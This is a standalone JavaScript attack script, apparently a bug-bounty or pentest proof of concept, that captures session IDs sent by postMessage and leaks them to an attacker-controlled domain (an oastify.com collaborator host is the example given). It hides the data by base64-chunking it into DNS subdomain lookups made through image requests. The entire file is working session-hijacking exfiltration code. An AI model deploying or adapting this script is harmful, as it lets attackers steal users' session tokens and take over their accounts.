  // session-id-exfil.js - DNS Exfiltration version                                                                                                    
  (function() {                                                                                                                                        
      console.log('[Exfil Script] Loaded - DNS exfiltration mode');                                                                                    
                                                                                                                                                       
      // Get exfil URL from query params                                                                                                               
      const params = new URLSearchParams(window.location.search || document.currentScript.src.split('?')[1]);                                          
      const exfilUrl = params.get('exfil');                                                                                                            
      const debug = params.get('debug') === '1';                                                                                                       
                                                                                                                                                       
      if (!exfilUrl) {                                                                                                                                 
          console.error('[Exfil Script] No exfil URL provided!');                                                                                      
          return;                                                                                                                                      
      }                                                     
                                                                                                                                                       
      // Extract base domain (e.g., "xxx.oastify.com")                                                                                                 
      const baseDomain = exfilUrl.replace(/^https?:\/\//, '').split('/')[0];                                                                           
      console.log('[Exfil Script] Base domain:', baseDomain);                                                                                          
                                                                                                                                                       
      // Listen for postMessage with session ID                                                                                                        
      window.addEventListener('message', function(event) {                                                                                             
          if (debug) console.log('[Exfil Script] Received message:', event.data);                                                                      
                                                                                                                                                       
          if (event.data && event.data.type === 'sessionId' && event.data.value) {                                                                     
              const sessionId = event.data.value;                                                                                                      
              console.log('[Exfil Script] Session ID captured, exfiltrating via DNS...');                                                              
                                                                                                                                                       
              // Chunk the session ID into DNS-safe pieces (max 63 chars per label)                                                                    
              // Base64 encode to make it DNS-safe                                                                                                     
              const encoded = btoa(sessionId)                                                                                                          
                  .replace(/\+/g, '-')                                                                                                                 
                  .replace(/\//g, '_')                                                                                                                 
                  .replace(/=/g, '');                                                                                                                  
                                                                                                                                                       
              // Split into chunks of 50 chars (DNS label limit is 63)                                                                                 
              const chunks = encoded.match(/.{1,50}/g) || [];                                                                                          
                                                                                                                                                       
              console.log('[Exfil Script] Encoded session ID into', chunks.length, 'chunks');                                                          
                                                                                                                                                       
              // Send each chunk via DNS lookup                                                                                                        
              chunks.forEach((chunk, index) => {            
                  const subdomain = `chunk${index}-${chunk}.${baseDomain}`;                                                                            
                  const img = new Image();                                                                                                             
                  img.src = 'https://' + subdomain + '/x.png';                                                                                         
                  console.log('[Exfil Script] DNS lookup:', subdomain);                                                                                
              });                                                                                                                                      
                                                                                                                                                       
              // Also send a completion marker                                                                                                         
              setTimeout(() => {                                                                                                                       
                  const doneMarker = `done-${chunks.length}chunks.${baseDomain}`;                                                                      
                  const img = new Image();                                                                                                             
                  img.src = 'https://' + doneMarker + '/complete.png';                                                                                 
                  console.log('[Exfil Script] Sent completion marker');                                                                                
              }, 100);                                                                                                                                 
          }                                                                                                                                            
      });                                                                                                                                              
                                                                                                                                                       
      console.log('[Exfil Script] Listening for postMessage events...');                                                                               
  })();    
